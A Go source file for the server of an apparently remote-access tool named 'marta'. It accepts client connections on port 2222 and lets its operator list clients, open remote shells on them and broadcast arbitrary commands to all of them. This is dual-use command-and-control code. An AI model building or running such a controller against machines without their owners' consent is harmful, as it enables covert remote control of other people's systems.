// server

package main

import (
	"bufio"
	"errors"
	"fmt"
	"log"
	"os"
	"strings"
)

var clients = NewClients()
var logger *log.Logger

func main() {

	f := initLogger()
	defer f.Close()

	pool := NewPool(clients, 2222)

	go pool.Start()

	commandLoop()
}

// Initializes the logger. Returns the filedecriptor so the main function can close it when it finishes.
func initLogger() *os.File {

	f, err := os.OpenFile("marta.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		logger.Fatalf("error opening file: %v", err)
	}

	logger = log.Default()

	logger.SetOutput(f)

	return f
}

func info(clientId string) error {

	if clientId != "" {
		client, err := clients.GetClientById(clientId)

		if err != nil {
			return err
		}

		client.RequestInfo()

		fmt.Println(client.Info.String())
	} else {
		clients.RequestInfo()

		for _, client := range clients.clientsMap {
			fmt.Println(client.Info.String())
		}
	}

	return nil
}

func list() {
	for _, client := range clients.clientsMap {
		fmt.Println(client.String())
	}
}

func kick(clientId string) error {

	if len(clientId) == 0 {
		return errors.New("could not kick client: client id was not passed")
	}

	client, err := clients.GetClientById(clientId)

	if err != nil {
		return err
	}

	clients.RemoveClient(*client)

	return nil
}

func shell(clientId string) error {

	if len(clientId) == 0 {
		return errors.New("could not kick client: client id was not passed")
	}

	client, err := clients.GetClientById(clientId)

	if err != nil {
		return errors.New("could not initiate shell: client with that id is not in array")
	}

	shell := NewShell(client)

	err = shell.Start()

	if err != nil {
		return err
	}

	return nil
}

// Ping the client with clientId or if clientId == "", ping all connected clients.
func ping(clientId string) error {

	// user wants to ping a specific client
	if len(clientId) == 0 {
		oks := clients.Ping()
		allResponded := true

		for client, ok := range oks {
			if ok {
				fmt.Printf("%s responded.\n", client.String())
			} else {
				fmt.Printf("%s did not respond or responded the wrong message.\n", client.String())
				allResponded = false
			}
		}

		if !allResponded {
			fmt.Print("Do you want to remove all inactive clients? (y/N): ")

			reader := bufio.NewReader(os.Stdin)
			r, s, _ := reader.ReadRune()

			if s == 0 {
				fmt.Println()
			} else if r == 'y' {
				fmt.Println("Removing inactive clients.")
				for client, ok := range oks {
					if !ok {
						clients.RemoveClient(client)
					}
				}
			}
		}

	} else {
		client, err := clients.GetClientById(clientId)

		if err != nil {
			return errors.New("could not ping client: client with that id is not in array")
		}

		ok := client.Ping()

		if ok {
			fmt.Printf("%s responded.\n", client.String())
		} else {
			fmt.Printf("%s did not respond or responded the wrong message.\n", client.String())
		}
	}

	return nil
}

func commandLoop() {
	reader := bufio.NewReader(os.Stdin)
	ctrlDCount := 0

	for {
		fmt.Print("☲ ")

		in, err := reader.ReadString('\n')

		if err != nil {
			ctrlDCount++
			if ctrlDCount > 1 {
				break
			}
			fmt.Println("Press Ctrl + D again, if you want to exit.")
			continue
		}

		in = strings.TrimSpace(in)
		split := strings.Split(in, " ")
		cmd := split[0]
		clientId := ""

		if len(split) > 1 {
			clientId = split[1]
		}

		if len(in) == 0 {
			continue
		}

		switch cmd {
		case "!info":
			err := info(clientId)
			if err != nil {
				fmt.Println(err)
			}
		case "!list":
			list()
		case "!kick":
			err := kick(clientId)
			if err != nil {
				fmt.Println(err)
			}
		case "!shell":
			err := shell(clientId)
			if err != nil {
				fmt.Println(err)
			}
		case "!ping":
			err := ping(clientId)
			if err != nil {
				fmt.Println(err)
			}
		default:
			responses := clients.SendWithRes(in)

			for _, res := range responses {
				fmt.Println("'" + strings.TrimRight(res, "\n") + "'")
			}
		}
	}
}
